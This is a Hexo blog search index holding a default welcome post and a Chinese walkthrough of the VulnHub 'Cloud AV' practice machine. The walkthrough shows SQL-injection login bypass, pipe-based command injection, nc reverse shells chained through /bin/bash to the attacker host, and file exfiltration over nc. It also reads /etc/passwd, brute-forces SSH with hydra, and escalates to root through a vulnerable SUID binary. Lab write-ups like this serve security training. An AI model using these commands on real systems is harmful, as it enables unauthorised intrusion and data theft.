<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/03/21/hello-world/"/>
      <url>/2022/03/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy_cloudantivirus</title>
      <link href="/2021/03/23/easy-cloudantivirus/"/>
      <url>/2021/03/23/easy-cloudantivirus/</url>
      
        <content type="html"><![CDATA[<p>靶机使用的是vulnhub上的靶机，主要是以练习为主，靶机作者建议最好使用VirtualBox虚拟机，这里使用VMware虚拟机进程测试，经测试会出现很多问题，建议大家按作者要求使用VirtualBox虚拟机。</p><h2 id="easy-cloudantivirus"><a href="#easy-cloudantivirus" class="headerlink" title="easy_cloudantivirus"></a>easy_cloudantivirus</h2><p>靶机地址：<a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</a></p><h3 id="0x01-内容简介"><a href="#0x01-内容简介" class="headerlink" title="0x01 内容简介"></a>0x01 内容简介</h3><p><strong>难度：</strong>低</p><p><strong>目标：</strong>获取root权限</p><p>主要运用攻击手段：</p><pre class=" language-powershell"><code class="language-powershell">端口扫描WEB侦查SQL注入命令注入密码爆破代码审计NC串联本地提权</code></pre><h3 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h3><p>下载好文件，导入VMware虚拟机</p><p>攻击机kali：192.221.21.100</p><p>目标靶机：192.221.21.148</p><h3 id="0x03-攻击开始"><a href="#0x03-攻击开始" class="headerlink" title="0x03 攻击开始"></a>0x03 攻击开始</h3><h4 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h4><p>使用<code>arping</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> $<span class="token punctuation">(</span>seq <span class="token number">1</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">;</span> do arping <span class="token operator">-</span>c <span class="token number">2</span> <span class="token number">192.221</span><span class="token punctuation">.</span><span class="token number">21</span><span class="token punctuation">.</span>$i<span class="token punctuation">;</span> done</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308144607408.png" class title="image-20220308144607408"><img src="/2021/03/23/easy-cloudantivirus/image-20220308144726938.png" class title="image-20220308144726938"><p>发现主机<code>192.221.21.148</code></p><h4 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h4><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>p<span class="token operator">-</span> 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>148</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308144944697.png" class title="image-20220308144944697"><h4 id="3-服务发现"><a href="#3-服务发现" class="headerlink" title="3.服务发现"></a>3.服务发现</h4><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>p22<span class="token punctuation">,</span>8080 <span class="token operator">-</span><span class="token function">sV</span> 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>148</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308145059413.png" class title="image-20220308145059413"><p>其中<code>8080</code>端口明显开着web服务，直接访问</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308145226492.png" class title="image-20220308145226492"><p>需要输入相应的邀请码才能成功登录</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><h4 id="4-SQL注入"><a href="#4-SQL注入" class="headerlink" title="4.SQL注入"></a>4.SQL注入</h4><p><strong>1）判断闭合符</strong></p><p>利用&#x3D;&#x3D;burpsuite&#x3D;&#x3D;抓包，发送到intruder</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308145803507.png" class title="image-20220308145803507"><p>再payload加入键盘上所有字符</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308150219563.png" class title="image-20220308150219563"><p>爆破</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308150428520.png" class title="image-20220308150428520"><p>发现<code>&quot;</code>返回与其他不同，这个显然是闭合符</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308150920140.png" class title="image-20220308150920140"><p>找到对应的SQL语句</p><pre class=" language-mysql"><code class="language-mysql">select * from code where password="; + password + ";</code></pre><p>注入<code>&quot;</code>之后</p><pre class=" language-mysql"><code class="language-mysql">select * from code where password="; + " + ";</code></pre><p>注入的<code>&quot;</code>与前面一个<code>&quot;</code>闭合，后面还有一个<code>&quot;</code>，出现错误</p><p><strong>2）判断注入</strong></p><pre class=" language-powershell"><code class="language-powershell">" or 1=1 <span class="token operator">--</span><span class="token operator">+</span></code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308151649379.png" class title="image-20220308151649379"><p>成功进入后台，根据提示可以发现这是个云查杀器，而且给了我们一些文件，提示我们可以扫描这些文件</p><p>根据前面获得的信息，这个主机是一台linux系统，再Linux命令行中应该是使用<code>扫描器 文件名</code>格式来进行扫描，如果这样的话，便有了一个可以利用的点管道符<code>|</code></p><blockquote><p>例</p><p>avscan hello | ls</p><p>管道符前面扫描的结果会传给ls，而ls就是查看当前目录</p></blockquote><p><strong>3）开始注入</strong></p><pre class=" language-powershell"><code class="language-powershell">hello <span class="token punctuation">|</span> id</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308152551585.png" class title="image-20220308152551585"><p>成功回显，继续注入，这里我们可以注入更多的字符来实现反弹shell，方法有很多，可以利用python反弹shell脚本，这里可以利用&#x3D;&#x3D;nc&#x3D;&#x3D;</p><p>首先判断目标主机上有没有nc</p><pre class=" language-powershell"><code class="language-powershell">hello <span class="token punctuation">|</span> which nc</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308153020284.png" class title="image-20220308153020284"><p>目标主机有nc，可以利用nc实现反弹shell</p><p>首先再主机上开启监听，监听4444端口</p><pre class=" language-powershell"><code class="language-powershell">nc <span class="token operator">-</span>nvlp 4444</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308153942846.png" class title="image-20220308153942846"><p><strong>4）反弹shell</strong></p><pre class=" language-powershell"><code class="language-powershell">hello <span class="token punctuation">|</span> nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 4444 <span class="token operator">-</span>e <span class="token operator">/</span>bin<span class="token operator">/</span>sh</code></pre><p>然后没有成功，原因大概是，因为不同版本的nc有些版本没有<code>-e</code>参数</p><p>再次尝试</p><pre class=" language-powershell"><code class="language-powershell">hello <span class="token punctuation">|</span> nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 4444</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308154248894.png" class title="image-20220308154248894"><p>成功建立连接，所有目标主机存在nc而且可以正常建立连接，但是没有<code>-e</code>参数，这里可以使用另外一种方法进行反弹shell</p><ul><li><strong>nc</strong></li></ul><pre class=" language-powershell"><code class="language-powershell">hello <span class="token punctuation">|</span> nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 3333 <span class="token punctuation">|</span> <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token punctuation">|</span> nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 4444</code></pre><p>在kali中开启两个监听</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308154933728.png" class title="image-20220308154933728"><img src="/2021/03/23/easy-cloudantivirus/image-20220308154943968.png" class title="image-20220308154943968"><img src="/2021/03/23/easy-cloudantivirus/image-20220308154955346.png" class title="image-20220308154955346"><p>开始注入</p><p><code>3333</code>端口成功连接</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308155027094.png" class title="image-20220308155027094"><p><code>4444</code>端口成功连接</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308155100627.png" class title="image-20220308155100627"><p>当我们在<code>3333</code>端口输入命令，命令的执行结果成功在<code>4444</code>端口显示</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308155149628.png" class title="image-20220308155149628"><p><strong>原理：</strong></p><pre class=" language-powershell"><code class="language-powershell">hello <span class="token punctuation">|</span> nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 3333 <span class="token punctuation">|</span> <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token punctuation">|</span> nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 4444</code></pre><p>当3333与4444成功连接，在3333输入的命令会通过管道符发送到&#x2F;bin&#x2F;bash解析，解析之后执行，执行结果再通过管道符发送给4444端口，进行在4444端口显示</p><p>查看当前目录的文件</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308155711968.png" class title="image-20220308155711968"><img src="/2021/03/23/easy-cloudantivirus/image-20220308155941366.png" class title="image-20220308155941366"><p>database.sql文件显示是一个数据库文件，尝试查看</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308160052171.png" class title="image-20220308160052171"><p>但是不能查看，我们可以尝试下载到本地，开启新的终端，进行监听5555端口</p><pre class=" language-powershell"><code class="language-powershell">nc <span class="token operator">-</span>nvlp 5555 > sqlite<span class="token punctuation">.</span>sql</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308160235082.png" class title="image-20220308160235082"><h4 id="5-下载文件"><a href="#5-下载文件" class="headerlink" title="5.下载文件"></a>5.下载文件</h4><p>传输文件</p><pre class=" language-powershell"><code class="language-powershell">nc 192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>100 5555 &lt; database<span class="token punctuation">.</span>sql</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308160400190.png" class title="image-20220308160400190"><img src="/2021/03/23/easy-cloudantivirus/image-20220308160508080.png" class title="image-20220308160508080"><p>打开sqlite.sql</p><pre class=" language-sqlite"><code class="language-sqlite">sqlite3sqlite> .open sqlite.sqlsqlite> .databasemain: /root/sqlite.sql r/wsqlite> .dump</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308160611676.png" class title="image-20220308160611676"><p>里面只有一个password，是一个文本文件，同时向数据库中导入了四个密码</p><p>查看目标主机存在的账号</p><pre class=" language-powershell"><code class="language-powershell"><span class="token function">cat</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308161112914.png" class title="image-20220308161112914"><p>很多账号，筛选可以使用shell登录的账号</p><pre class=" language-powershell"><code class="language-powershell"><span class="token function">cat</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd <span class="token punctuation">|</span> grep <span class="token operator">/</span>bin<span class="token operator">/</span>bash</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308161357576.png" class title="image-20220308161357576"><p>一共有三个账号root，cloudav，scanner</p><h4 id="6-爆破密码"><a href="#6-爆破密码" class="headerlink" title="6.爆破密码"></a>6.爆破密码</h4><p>将账号和密码加入字典</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308161734199.png" class title="image-20220308161734199"><pre class=" language-powershell"><code class="language-powershell">hydra <span class="token operator">-</span>L user<span class="token punctuation">.</span>txt <span class="token operator">-</span>P pass<span class="token punctuation">.</span>txt ssh:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>221<span class="token punctuation">.</span>21<span class="token punctuation">.</span>148</code></pre><img src="/2021/03/23/easy-cloudantivirus/image-20220308161926240.png" class title="image-20220308161926240"><p>但是并没有爆破成功，并没有可以登录的密码</p><h4 id="7-收集信息"><a href="#7-收集信息" class="headerlink" title="7.收集信息"></a>7.收集信息</h4><p>爆破没有成功，需要换别的思路，我们查看别的文件有没有可用信息</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308162450556.png" class title="image-20220308162450556"><p>最终我们发现一共可疑文件</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308163542159.png" class title="image-20220308163542159"><p>这个文件有强制位setuid，并且属主是root，这就说明制可执行文件使文件在执行阶段具有文件所有者的权限，意味着执行这个文件会有root的权限</p><p><strong>update_cloudav文件源代码：</strong></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>freshclam<span class="token operator">=</span><span class="token string">"/usr/bin/freshclam"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>command <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>freshclam<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"%s %s"</span><span class="token punctuation">,</span> freshclam<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>通过代码我们发现，当我们执行<code>update_cloudav</code>时会调用<code>/usr/bin/freshclam</code>，同时需要跟上一个参数</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308164304133.png" class title="image-20220308164304133"><h4 id="8-SUID提权"><a href="#8-SUID提权" class="headerlink" title="8.SUID提权"></a>8.SUID提权</h4><p>接着使用<code>nc串联</code></p><pre class=" language-powershell"><code class="language-powershell"><span class="token punctuation">.</span><span class="token operator">/</span>update_cloudav <span class="token string">"a|nc 192.221.21.100 6666 | /bin/bash | nc 192.221.21.100 7777"</span></code></pre><p>开启监听</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308164610925.png" class title="image-20220308164610925"><img src="/2021/03/23/easy-cloudantivirus/image-20220308164629291.png" class title="image-20220308164629291"><p>成功连接</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308164729690.png" class title="image-20220308164729690"><img src="/2021/03/23/easy-cloudantivirus/image-20220308164739111.png" class title="image-20220308164739111"><p>查看权限</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308164855240.png" class title="image-20220308164855240"><img src="/2021/03/23/easy-cloudantivirus/image-20220308164909282.png" class title="image-20220308164909282"><p>提权成功，获取到root权限</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="9-暴力破解"><a href="#9-暴力破解" class="headerlink" title="9.暴力破解"></a>9.暴力破解</h4><p>抓包，发送到intruder</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308165335613.png" class title="image-20220308165335613"><p>设置好爆破位置，添加字典，开始爆破</p><img src="/2021/03/23/easy-cloudantivirus/image-20220308165659726.png" class title="image-20220308165659726"><img src="/2021/03/23/easy-cloudantivirus/image-20220308165751605.png" class title="image-20220308165751605"><img src="/2021/03/23/easy-cloudantivirus/image-20220308165841292.png" class title="image-20220308165841292"><p>当密码是password时，服务器会重定向到&#x2F;scan页面，说明password就是可用的邀请码</p><p>打靶完成！</p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
